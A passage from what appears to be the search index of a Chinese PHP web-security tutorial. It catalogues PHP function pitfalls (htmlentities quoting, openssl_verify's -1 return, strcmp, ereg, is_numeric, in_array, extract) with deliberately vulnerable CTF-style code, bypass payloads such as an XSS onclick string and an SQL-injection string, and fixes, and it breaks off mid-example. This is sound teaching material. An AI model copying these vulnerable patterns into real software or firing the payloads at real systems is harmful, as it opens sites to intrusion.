<code>https://blog.csdn.net/u011721501/article/details/43775691</code></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_35","title":"\u6f0f\u6d1e\u4fee\u590d","text":"<p>\u5bf9\u4e8e\u7279\u70b9\u60c5\u51b5\uff0c\u53ef\u5173\u95ed\u81ea\u52a8\u8c03\u7528 <code>bool $autoload = false</code></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#htmlentities","title":"htmlentities()\u51fd\u6570","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_36","title":"\u76f8\u5173\u77e5\u8bc6","text":"<p>(PHP 4, PHP 5, PHP 7) htmlentities \u2014 \u5c06\u5b57\u7b26\u8f6c\u6362\u4e3a HTML \u8f6c\u4e49\u5b57\u7b26 string htmlentities ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string $encoding = ini_get(\"default_charset\") [, bool $double_encode = true ]]] )  \u672c\u51fd\u6570\u5404\u65b9\u9762\u90fd\u548c htmlspecialchars() \u4e00\u6837\uff0c \u9664\u4e86 htmlentities() \u4f1a\u8f6c\u6362\u6240\u6709\u5177\u6709 HTML \u5b9e\u4f53\u7684\u5b57\u7b26\u3002 \u5982\u679c\u8981\u89e3\u7801\uff08\u53cd\u5411\u64cd\u4f5c\uff09\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>html_entity_decode()</code>\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_37","title":"\u6f0f\u6d1e\u95ee\u9898","text":"<p>\u4ece\u4e0a\u8ff0\u77e5\u8bc6\u6765\u770b\uff0c\u8be5\u51fd\u6570\u5e94\u8be5\u662f\u7528\u6765\u9884\u9632XSS\uff0c\u8fdb\u884c\u8f6c\u4e49\u7684\u4e86 \u4f46\u662f\u4e0d\u5e78\u7684\u662f \u8be5\u51fd\u6570\u9ed8\u8ba4\u4f7f\u7528\u7684\u662fENT_COMPAT \u5373\u4e0d\u4f1a\u8f6c\u4e49\u5355\u5f15\u53f7\uff0c\u90a3\u4e48\u5c31\u53ef\u80fd\u4ea7\u751f\u975e\u5e38\u4e25\u91cd\u7684\u95ee\u9898\uff0c\u4f8b\u5982\u5982\u4e0b\u6848\u4f8b</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_38","title":"\u5178\u578b\u6848\u4f8b","text":"<p><pre><code>$sanitized = [];\n\nforeach ($_GET as $key =&gt; $value) {\n    $sanitized[$key] = intval($value);\n}\n\n$queryParts = array_map(function ($key, $value) {\n    return $key . '=' . $value;\n}, array_keys($sanitized), array_values($sanitized));\n\n$query = implode('&amp;', $queryParts);\n\necho \"&lt;a href='/images/size.php?\" .\n    htmlentities($query) . \"'&gt;link&lt;/a&gt;\";\n</code></pre> \u7531\u4e8e\u4e0d\u4f1a\u8f6c\u4e49\u5355\u5f15\u53f7 \u6211\u4eec\u53ef\u4ee5\u968f\u610f\u95ed\u5408 <code>&lt;a href='/images/size.php?htmlentities($query)'&gt;link&lt;/a&gt;</code> \u6b64\u65f6\u6211\u4eec\u66ff\u6362htmlentities($query)\u4e3a <code>' onclick=alert(1) //</code> \u8fd9\u6837\u539f\u8bed\u53e5\u5c31\u53d8\u6210\u4e86 <code>&lt;a href='/images/size.php?' onclick=alert(1) //'&gt;link&lt;/a&gt;</code> \u8fd9\u6837\u5c31\u6210\u529f\u7684\u5f15\u8d77\u4e86xss \u6545\u6b64\u6700\u7ec8\u7684payload\u4e3a <code>/?a'onclick%3dalert(1)%2f%2f=c</code></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_39","title":"\u6f0f\u6d1e\u4fee\u590d","text":"<p>\u5fc5\u8981\u7684\u65f6\u5019\u52a0\u4e0aENT_QUOTES\u9009\u9879</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#openssl_verify","title":"openssl_verify()\u51fd\u6570","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_40","title":"\u76f8\u5173\u77e5\u8bc6","text":"<p>(PHP 4 &gt;= 4.0.4, PHP 5, PHP 7) openssl_verify \u2014 \u9a8c\u8bc1\u7b7e\u540d int openssl_verify ( string $data , string $signature , mixed $pub_key_id [, mixed $signature_alg = OPENSSL_ALGO_SHA1 ] )  openssl_verify() \u4f7f\u7528\u4e0epub_key_id\u5173\u8054\u7684\u516c\u94a5\u9a8c\u8bc1\u6307\u5b9a\u6570\u636edata\u7684\u7b7e\u540dsignature\u662f\u5426\u6b63\u786e\u3002\u8fd9\u5fc5\u987b\u662f\u4e0e\u7528\u4e8e\u7b7e\u540d\u7684\u79c1\u94a5\u76f8\u5bf9\u5e94\u7684\u516c\u94a5\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_41","title":"\u6f0f\u6d1e\u95ee\u9898","text":"<p>\u8fd9\u4e2a\u51fd\u6570\u770b\u8d77\u6765\u662f\u7528\u4e8e\u9a8c\u8bc1\u7b7e\u540d\u6b63\u786e\u6027\u7684\uff0c\u600e\u4e48\u4f1a\u4ea7\u751f\u6f0f\u6d1e\u5462\uff1f \u6211\u4eec\u6ce8\u610f\u5230\u5b83\u7684\u8fd4\u56de\u503c\u60c5\u51b5 \u5176\u4e2d\uff0c\u5185\u90e8\u53d1\u9001\u9519\u8bef\u4f1a\u8fd4\u56de-1 \u6211\u4eec\u77e5\u9053if\u5224\u65ad\u4e2d\uff0c-1\u548c1\u540c\u6837\u90fd\u53ef\u4ee5\u88ab\u5f53\u505atrue \u90a3\u4e48\u5047\u8bbe\u5b58\u5728\u8fd9\u6837\u7684\u60c5\u51b5 <code>if(openssl_verify())</code> \u90a3\u4e48\u5b83\u51fa\u73b0\u9519\u8bef\u7684\u65f6\u5019\uff0c\u5219\u540c\u6837\u53ef\u4ee5\u7ecf\u8fc7check\u8fdb\u5165\u540e\u7eed\u7a0b\u5e8f \u5982\u4f55\u89e6\u53d1\u9519\u8bef\u5462\uff1f \u5b9e\u9645\u4e0a\u53ea\u8981\u4f7f\u7528\u53e6\u4e00\u4e2a\u4e0e\u5f53\u524d\u516c\u94a5\u4e0d\u5339\u914d\u7684\u7b97\u6cd5\u751f\u6210\u7684\u7b7e\u540d\uff0c\u5373\u53ef\u89e6\u53d1\u9519\u8bef</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_42","title":"\u5178\u578b\u6848\u4f8b","text":"<p><pre><code>class JWT {\n    public function verifyToken($data, $signature) {\n        $pub = openssl_pkey_get_public(\"file://pub_key.pem\");\n        $signature = base64_decode($signature);\n        if (openssl_verify($data, $signature, $pub)) {\n            $object = json_decode(base64_decode($data));\n            $this-&gt;loginAsUser($object);\n        }\n    }\n}\n\n(new JWT())-&gt;verifyToken($_GET['d'], $_GET['s']);\n</code></pre> \u6b64\u65f6\u6211\u4eec\u53ea\u9700\u8981\u4f7f\u7528\u4e00\u4e2a\u4e0d\u540c\u4e8e\u5f53\u524d\u7b97\u6cd5\u7684\u516c\u94a5\u7b97\u6cd5\uff0c\u751f\u6210\u4e00\u4e2a\u6709\u6548\u7b7e\u540d\uff0c\u7136\u540e\u4f20\u5165\u53c2\u6570 \u5373\u53ef\u5bfc\u81f4openssl_verify()\u53d1\u751f\u5185\u90e8\u9519\u8bef\uff0c\u8fd4\u56de-1\uff0c\u987a\u5229\u901a\u8fc7\u9a8c\u8bc1\uff0c\u8fbe\u6210\u7b7e\u540d\u65e0\u6548\u4f9d\u7136\u53ef\u4ee5\u901a\u8fc7\u7684\u76ee\u7684</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_43","title":"\u6f0f\u6d1e\u4fee\u590d","text":"<p>if\u5224\u65ad\u4e2d\u4f7f\u7528 if(openssl_verify()===1) </p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#intval","title":"intval()\u7f3a\u9677","text":"<p>intval\u51fd\u6570\u7528\u4e8e\u83b7\u53d6\u53d8\u91cf\u7684\u6574\u6570\u503c\u3002\u901a\u8fc7\u4f7f\u7528\u6307\u5b9a\u7684\u8fdb\u5236 base \u8f6c\u6362\uff08\u9ed8\u8ba4\u662f\u5341\u8fdb\u5236\uff09\uff0c\u8fd4\u56de\u53d8\u91cf var \u7684 integer \u6570\u503c\u3002 intval() \u4e0d\u80fd\u7528\u4e8e object\uff0c\u5426\u5219\u4f1a\u4ea7\u751f E_NOTICE \u9519\u8bef\u5e76\u8fd4\u56de 1\u3002 \u672c\u6765\u60f3\u5199\u5728php\u51fd\u6570\u7f3a\u9677\u5185\u7684\uff0c\u4f46\u662f\u8fd9\u4e2a\u51fd\u6570\uff0c\u5f80\u5f80\u5728\u8fdb\u884c\u6bd4\u8f83\u65f6\u4f7f\u7528\u3002 intval() \u5728\u8f6c\u6362\u7684\u65f6\u5019\uff0c\u4f1a\u4ece\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u8fdb\u884c\u8f6c\u6362\u76f4\u5230\u9047\u5230\u4e00\u4e2a\u975e\u6570\u5b57\u7684\u5b57\u7b26\u3002\u5373\u4f7f\u51fa\u73b0\u65e0\u6cd5\u8f6c\u6362\u7684\u5b57\u7b26\u4e32\uff0cintval() \u4e0d\u4f1a\u62a5\u9519\u800c\u662f\u8fd4\u56de 0  \u4f8b\u5982\uff1a <pre><code>var_dump(intval('2')) // 2\nvar_dump(intval('3abcd')) // 3\n\nvar_dump(intval('abcd')) // 0\n\n\nvar_dump(0 == '0'); // true\nvar_dump(0 == 'abcdefg'); // true \nvar_dump(0 === 'abcdefg'); // false\nvar_dump(1 == '1abcdef'); // true\n\nif(intval($a) &gt; 1000) {\n\n    mysql_query(\"select * from news where id=\".$a)\n\n}\n</code></pre></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#strcmp","title":"strcmp\u51fd\u6570\u7f3a\u9677","text":"<p>\u8fd9\u4e2a\u51fd\u6570\u4e5f\u7ecf\u5e38\u7684\u88ab\u4f7f\u7528\u5230\uff0c\u4e5f\u662f\u4e00\u4e2a\u7ecf\u5178\u51fd\u6570\u3002 \u5b9a\u4e49:  int strcmp ( string $str1 , string $str2 )     \u53c2\u6570 str1\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002str2\u7b2c\u4e8c\u4e2a\u5b57\u7b26\u4e32\u3002\u5982\u679c str1 \u5c0f\u4e8e str2 \u8fd4\u56de &lt; 0\uff1b \u5982\u679c str1 \u5927\u4e8e str2 \u8fd4\u56de &gt; 0\uff1b\u5982\u679c\u4e24\u8005\u76f8\u7b49\uff0c\u8fd4\u56de 0\u3002 \u6f0f\u6d1e\uff1a \u5728php5.3\u4e4b\u524d\uff0c\u5f53\u8fd9\u4e2a\u51fd\u6570\u63a5\u53d7\u5230\u4e86\u4e0d\u7b26\u5408\u7684\u7c7b\u578b\uff0c\u8fd9\u4e2a\u51fd\u6570\u5c06\u53d1\u751f\u9519\u8bef\uff0c\u663e\u793a\u4e86\u62a5\u9519\u7684\u8b66\u544a\u4fe1\u606f\u540e\uff0c\u5c06return 0\u3002  \u7ecf\u5178\u9898\u76ee\uff1a <pre><code>&lt;?php\n$password=\"***************\";\n$a = array();\n    if (strcmp($a, $password) == 0) {\n        echo \"Right!!!login success\";\n        exit();\n    } else {\n        echo \"Wrong password..\";\n}\n?&gt;\n\u7ed3\u679c\u8f93\u51fa Right!!!login success\u3002\n</code></pre></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#eregeregi","title":"ereg()\uff0ceregi()\u51fd\u6570\u7f3a\u9677","text":"<ul> <li>ereg\u51fd\u6570\u5b58\u5728\u4e24\u4e2a\u6f0f\u6d1e\uff1a </li> <li>%00\u622a\u65ad\uff0c\u5728\u9047\u5230%00\u7684\u65f6\u5019\u4f1a\u8ba4\u4e3a\u5b57\u7b26\u4e32\u7ed3\u675f\u4e86</li> <li>ereg\u51fd\u6570\u4e2d\u7684\u53c2\u6570\u503c\u5982\u679c\u4e3a\u6570\u7ec4\uff0c\u4f1a\u8fd4\u56defalse</li> </ul> <p>eregi\u8ddfereg\u51fd\u6570\u6f0f\u6d1e\u57fa\u672c\u4e00\u6837\uff0c\u533a\u522b\u5728\u4e8eereg\u533a\u5206\u5927\u5c0f\u5199(\u8fd9\u91cc\u5212\u91cd\u70b9\uff0c\u4e5f\u662f\u53ef\u4ee5\u7528\u6765\u7ed5\u8fc7\u7684),eregi\u51fd\u6570\u4e0d\u533a\u5206\u5927\u5c0f\u5199\u3002 \u7ecf\u5178\u9898\u76ee\uff1a <pre><code>&lt;?php\nif (isset ($_GET['password'])) {\n    if (ereg (\"^[a-zA-Z0-9]+$\",$_GET['password']) === FALSE)    \n       {\n        echo '&lt;p&gt;You password must be alphanumeric&lt;/p&gt;';\n    }\n    else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999)\n    {\n        if (strpos ($_GET['password'], '*-*') !== FALSE)\n        {\n            die('Flag: ' . $flag);\n        }\n        else\n        {\n            echo('&lt;p&gt;*-* have not been found&lt;/p&gt;');\n        }\n    }\n    else\n    {\n        echo '&lt;p&gt;Invalid password&lt;/p&gt;';\n    }\n}\n?&gt;\n\u9644\uff1apayload= 1e9%00*-*\n</code></pre></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#strlen","title":"strlen()\u51fd\u6570\u7f3a\u9677","text":"<p>\u8fd9\u4e2a\u51fd\u6570\u4e5f\u662fCTF\u51fd\u6570\u9ed1\u9b54\u6cd5\u4e2d\u7684\u7ecf\u5178\u51fd\u6570\uff0c\u81ea\u6211\u77db\u76fe\u3002\u7528\u6765\u8fdb\u884c\u5224\u65ad\u957f\u5ea6\uff0c\u7136\u540e\u7ed3\u5408\u5927\u5c0f\u6bd4\u8f83\u6765\u8fdb\u884c\u51fa\u9898\u3002 \u4f46\u662f\u53ef\u4ee5\u901a\u8fc7\u79d1\u5b66\u8ba1\u6570\u6cd5\u7684\u65b9\u6cd5\u6765\u8fdb\u884c\u7ed5\u8fc7\u3002\u6bd4\u5982\uff1a <code>1e9</code> \u7ecf\u5178\u9898\u76ee\uff1a <pre><code>&lt;?php\n@$a = $_GET['num'];\nif(strlen($a)&lt;4 &amp;&amp; $a&gt;10000){\n    echo $flag;\n}\nelse{\n    echo \"is too small\";\n}\n?&gt;\n</code></pre></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#preg_matchpreg_match_all","title":"preg_match()\uff0cpreg_match_all()\u51fd\u6570\u7f3a\u9677","text":"<p>\u5148\u8bf4preg_match()\u51fd\u6570\uff0c\u662f\u4e3a\u4e86\u5f25\u8865ereg\u51fd\u6570\u7684%00\u622a\u65ad\u95ee\u9898\uff0c\u66ff\u6362\u4e86ereg\u51fd\u6570\u3002\u4f46\u662f\uff0c\u5728CTF\u4e2d\u8e29\u4e86\u90a3\u4e48\u591a\u5751\u4ee5\u540e\uff0c\u7ec8\u4e8e\u53d1\u73b0\u4e86\u5236\u88c1\u5b83\u7684\u65b9\u6cd5\uff0c\u6784\u9020\u6570\u7ec4\uff0c\u5c31\u53ef\u4ee5\u4e86\u3002 \u7ecf\u5178\u9898\u76ee\uff1a <code>payload: id[]=1</code> <pre><code>&lt;?php\n$str = intval($_GET['id']);\n$reg = preg_match('/\\d/is', $_GET['id']);    //\u67090-9\u7684\u6570\u5b57 \u548c.\u5728\u5185\u7684\u7b26\u53f7\nif(!is_numeric($_GET['id']) and $reg !== 1 and $str === 1){\n    echo 'Flag';\n}else{\n    echo \"no\";\n}// \u6700\u7ec8\u8f93\u51fa\u4e86Flag\n?&gt;\n</code></pre> preg_match()\u51fd\u6570\u8fd8\u5b58\u5728\u53e6\u4e00\u4e2a\u95ee\u9898\uff0cpreg_match \u51fd\u6570\u7528\u4e8e\u8fdb\u884c\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\uff0c\u8fd4\u56de pattern \u7684\u5339\u914d\u6b21\u6570\uff0c\u5b83\u7684\u503c\u5c06\u662f 0 \u6b21\uff08\u4e0d\u5339\u914d\uff09\u6216 1 \u6b21\uff0c\u56e0\u4e3a preg_match() \u5728\u7b2c\u4e00\u6b21\u5339\u914d\u540e\u5c06\u4f1a\u505c\u6b62\u641c\u7d22\u3002\u5982\u679c\u5728\u8fdb\u884c\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u7684\u65f6\u5019\uff0c\u6ca1\u6709\u9650\u5236\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u548c\u7ed3\u675f(^ \u548c $)\uff0c\u5219\u53ef\u4ee5\u5b58\u5728\u7ed5\u8fc7\u7684\u95ee\u9898\u3002 \u7ecf\u5178\u9898\u76ee\uff1a <code>payload:ip=127.0.0.1 abcdasd</code> <pre><code>&lt;?php\n$ip = $_GET['ip']; // \u53ef\u4ee5\u7ed5\u8fc7\nif(!preg_match(\"/(\\d+)\\.(\\d+)\\.(\\d+)\\.(\\d+)/\",$ip)) {\n  die('error');\n} else {\n  echo \"Flag\";\n}\n?&gt;// Flag\n</code></pre> preg_match_all()\u8fd9\u4e2a\u51fd\u6570\u8fd8\u6ca1\u6709\u5355\u72ec\u7684\u78b0\u5230\u8fc7\uff0c\u78b0\u5230\u4e86\u518d\u505a\u603b\u7ed3\u5427\u3002\uff08\u6211\u4e0d\u662f\u6807\u9898\u515a\uff09</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#is_numerictrim","title":"is_numeric()\u51fd\u6570\u7f3a\u9677&amp;trim()\u51fd\u6570\u7f3a\u9677","text":"<p>is_numeric() \u51fd\u6570\u7528\u4e8e\u68c0\u6d4b\u53d8\u91cf\u662f\u5426\u4e3a\u6570\u5b57\u6216\u6570\u5b57\u5b57\u7b26\u4e32\u3002\u5982\u679c\u6307\u5b9a\u7684\u53d8\u91cf\u662f\u6570\u5b57\u548c\u6570\u5b57\u5b57\u7b26\u4e32\u5219\u8fd4\u56de TRUE\uff0c\u5426\u5219\u8fd4\u56de FALSE\u3002 \u597d\uff0c\u90a3\u4e48\u95ee\u9898\u6765\u4e86\uff0c\u5bf9\u4e8e16\u8fdb\u5236\u7684\u5b57\u7b26\u4e32\uff0c\u662f\u600e\u4e48\u5224\u65ad\u7684\u5462\uff1f \u5b83\u4f1a\u9ed8\u8ba416\u8fdb\u5236\u7684\u5b57\u7b26\u4e32\u4e3a\u6574\u5f62\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u6784\u902016\u8fdb\u5236\u7684payload\u6765\u8fdb\u884c\u51fd\u6570\u7ed5\u8fc7\u3002 \u4f8b\u9898\uff1a <pre><code>16\u8fdb\u5236\u7684abc=0x616263\n&lt;?php\nheader('content-type:text/html;charset=utf-8');\n$a=$_GET['num'];\nvar_dump($a);\nif(is_numeric($a)){\n    echo \"\u60a8\u8f93\u5165\u7684\u662f\u6570\u5b57\";\n}else{\n    echo \"\u8bf7\u8f93\u5165\u5408\u6cd5\u5b57\u7b26\";\n}\n?&gt;\n</code></pre> <pre><code>&lt;?php\necho is_numeric(233333);       // 1\necho is_numeric('233333');    // 1\necho is_numeric(0x233333);    // 1\necho is_numeric('0x233333');    // 1\necho is_numeric('9e9');   // 1\necho is_numeric('233333abc');  // 0\n?&gt;\n</code></pre> is_numeric \u68c0\u6d4b\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u8fc7\u6ee4\u6389\u524d\u9762\u7684 \u2018 \u2018, \u2018\\t\u2019, \u2018\\n\u2019, \u2018\\r\u2019, \u2018\\v\u2019, \u2018\\f\u2019 \u7b49\u5b57\u7b26\uff0c\u4f46\u662f\u4e0d\u4f1a\u8fc7\u6ee4 \u2018\\0\u2019\uff0c\u5982\u679c\u8fd9\u4e9b\u5b57\u7b26\u51fa\u73b0\u5728\u5b57\u7b26\u4e32\u5c3e\uff0c\u4e5f\u4e0d\u4f1a\u8fc7\u6ee4\uff0c\u800c\u662f\u8fd4\u56de false trim \u51fd\u6570\u4f1a\u8fc7\u6ee4\u7a7a\u683c\u4ee5\u53ca \\n\\r\\t\\v\\0\uff0c\u4f46\u4e0d\u4f1a\u8fc7\u6ee4\u8fc7\u6ee4\\f <code>$a = \"  \\n\\r\\t\\v\\0abc  \\f\"; var_dump(trim($a)); // abc  \\f</code> \u5229\u7528trim\u51fd\u6570\u4ee5\u53cais_numeric\u51fd\u6570\u5b9e\u73b0\u7ed5\u8fc7\uff1a <pre><code>&lt;?php\n    // %0c1%00\n    $number = \"\\f1\\0\";\n    // trim \u51fd\u6570\u4f1a\u8fc7\u6ee4 \\n\\r\\t\\v\\0\uff0c\u4f46\u4e0d\u4f1a\u8fc7\u6ee4\u8fc7\u6ee4\\f\n    $number_2 = trim($number);\n    var_dump($number_2); // \\f1\n    $number_2 = addslashes($number_2);\n    var_dump($number_2);  // \n\\f1\n    // is_numeric \u68c0\u6d4b\u7684\u65f6\u5019\u4f1a\u8fc7\u6ee4\u6389 '', '\\t', '\\n', '\\r', '\\v', '\\f' \u7b49\u5b57\u7b26\n    // \u4f46\u662f\u4e0d\u4f1a\u8fc7\u6ee4 '\\0'\n    var_dump(is_numeric($number)); // false\n    var_dump(strval(intval($number_2))); // 1\n    var_dump(\"\\f1\" == \"1\"); // true\n?&gt;\n</code></pre></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#in_array_1","title":"in_array()\u51fd\u6570\u7f3a\u9677","text":"<p>in_array()\u51fd\u6570\u7528\u6765\u5224\u65ad\u5b57\u7b26\u4e32\u662f\u5426\u5b58\u5728\u4e0e\u6570\u7ec4\u4e2d\uff0c\u4f46\u662f\u5728\u5224\u65ad\u7684\u65f6\u5019\uff0c\u4f1a\u8fdb\u884c\u7c7b\u578b\u5f3a\u5236\u8f6c\u6362\uff0c\u5c31\u4f1a\u51fa\u73b0\u6570\u5b57\u6bd4\u8f83\u7684\u60c5\u51b5\u3002 \u7ecf\u5178\u4f8b\u9898\uff1a <pre><code>&lt;?php\n$array=[0,1,2,'3'];  \nvar_dump(in_array('abc', $array)); // true\nvar_dump(in_array('1bc', $array)); // true\n?&gt;\n</code></pre> \u90a3\u8fd9\u79cd\u60c5\u51b5\uff0c\u5728SQL\u6ce8\u5165\u65f6\uff0c\u5c31\u53ef\u4ee5\u4ea7\u751f\u5f88\u5927\u7684\u4f5c\u7528\uff0c\u6bd4\u5982\uff1a payload: <code>a = 1' or 1=1--+</code> <pre><code>&lt;?php\n@$a = $_GET['a'];\n$arr = [1,2,3,4];\nif(in_array($a,$arr)){\n    echo \"success!\";// \u8f93\u51fasuccess\n}\n?&gt;\n</code></pre></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#strpos","title":"strpos()\u51fd\u6570\u7f3a\u9677","text":"<p>strpos() \u51fd\u6570\u67e5\u627e\u5b57\u7b26\u4e32\u5728\u53e6\u4e00\u5b57\u7b26\u4e32\u4e2d\u7b2c\u4e00\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e\uff08\u533a\u5206\u5927\u5c0f\u5199\uff09\u3002 \u7ecf\u5178\u9898\u76ee\uff1a <pre><code>&lt;?php\nif(strpos($_GET['a'],'abc') == 0 ){\n    echo '123';\n}\nelse{\n    echo '456';\n}\n?&gt;\n</code></pre> \u4f20\u5165abc\u6216\u4f1a\u6253\u5370123\uff0c\u4f46\u662f\u4f20\u5165\u4e00\u4e2a\u6570\u7ec4\u6216\u8005\u4e0d\u4f20\u5165\u6570\u636e\u4e00\u6837\u4e5f\u4f1a\u6253\u5370123\u3002\u8fd9\u4e2a\u51fd\u6570\u4e5f\u662f\u53ea\u89e3\u6790string\u7c7b\u578b\u7684\u5b57\u7b26\u4e32\uff0c\u7ed9\u4ed6\u4e2a\u6570\u7ec4\u5c31\u4e0d\u77e5\u9053\u5982\u4f55\u89e3\u6790\uff0c\u4e8e\u662f\u5c31\u8fd4\u56de\u4e3anull\u3002Null==0\uff01\u5f53\u4e0d\u4f20\u5165\u6570\u636e\u7684\u65f6\u5019\uff0c\u4e5f\u662f\u4e00\u6837\u7684\u9053\u7406\uff0c\u8fd8\u662f\u8fd4\u56denull\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_44","title":"\u53d8\u91cf\u8986\u76d6","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#extract","title":"extract()\u51fd\u6570","text":"<p>\u7528\u6cd5\uff1a extract() \u51fd\u6570\u4ece\u6570\u7ec4\u4e2d\u5c06\u53d8\u91cf\u5bfc\u5165\u5230\u5f53\u524d\u7684\u7b26\u53f7\u8868\u3002\u8be5\u51fd\u6570\u4f7f\u7528\u6570\u7ec4\u952e\u540d\u4f5c\u4e3a\u53d8\u91cf\u540d\uff0c\u4f7f\u7528\u6570\u7ec4\u952e\u503c\u4f5c\u4e3a\u53d8\u91cf\u503c\u3002\u9488\u5bf9\u6570\u7ec4\u4e2d\u7684\u6bcf\u4e2a\u5143\u7d20\uff0c\u5c06\u5728\u5f53\u524d\u7b26\u53f7\u8868\u4e2d\u521b\u5efa\u5bf9\u5e94\u7684\u4e00\u4e2a\u53d8\u91cf\u3002 EXTR_OVERWRITE - \u9ed8\u8ba4\u3002\u5982\u679c\u6709\u51b2\u7a81\uff0c\u5219\u8986\u76d6\u5df2\u6709\u7684\u53d8\u91cf\u3002 EXTR_SKIP - \u5982\u679c\u6709\u51b2\u7a81\uff0c\u4e0d\u8986\u76d6\u5df2\u6709\u7684\u53d8\u91cf\u3002 EXTR_PREFIX_SAME - \u5982\u679c\u6709\u51b2\u7a81\uff0c\u5728\u53d8\u91cf\u540d\u524d\u52a0\u4e0a\u524d\u7f00 prefix\u3002 EXTR_PREFIX_ALL - \u7ed9\u6240\u6709\u53d8\u91cf\u540d\u52a0\u4e0a\u524d\u7f00 prefix\u3002 EXTR_PREFIX_INVALID - \u4ec5\u5728\u4e0d\u5408\u6cd5\u6216\u6570\u5b57\u53d8\u91cf\u540d\u524d\u52a0\u4e0a\u524d\u7f00 prefix\u3002 EXTR_IF_EXISTS - \u4ec5\u5728\u5f53\u524d\u7b26\u53f7\u8868\u4e2d\u5df2\u6709\u540c\u540d\u53d8\u91cf\u65f6\uff0c\u8986\u76d6\u5b83\u4eec\u7684\u503c\u3002\u5176\u5b83\u7684\u90fd\u4e0d\u5904\u7406\u3002 EXTR_PREFIX_IF_EXISTS - \u4ec5\u5728\u5f53\u524d\u7b26\u53f7\u8868\u4e2d\u5df2\u6709\u540c\u540d\u53d8\u91cf\u65f6\uff0c\u5efa\u7acb\u9644\u52a0\u4e86\u524d\u7f00\u7684\u53d8\u91cf\u540d\uff0c\u5176\u5b83\u7684\u90fd\u4e0d\u5904\u7406\u3002 EXTR_REFS - \u5c06\u53d8\u91cf\u4f5c\u4e3a\u5f15\u7528\u63d0\u53d6\u3002\u5bfc\u5165\u7684\u53d8\u91cf\u4ecd\u7136\u5f15\u7528\u4e86\u6570\u7ec4\u53c2\u6570\u7684\u503c\u3002 \u8fd9\u4e2a\u51fd\u6570\u7684\u91cd\u70b9\u5c31\u662f\u9ed8\u8ba4\u5c06\u5df2\u7ecf\u6709\u7684\u53d8\u91cf\u7ed9\u8986\u76d6\u6389 \u5176\u5b9e\u5f88\u7b80\u5355\uff0c\u5c31\u662f\u53d8\u91cf\u8986\u76d6\uff0c\u7ed9\u4e2a\u4f8b\u9898\u4e00\u770b\u5c31\u77e5\u9053\u4e86\uff1a <pre><code>&lt;?php\n  $auth = 'yaun';  \n    extract($_GET); \n    if($auth == 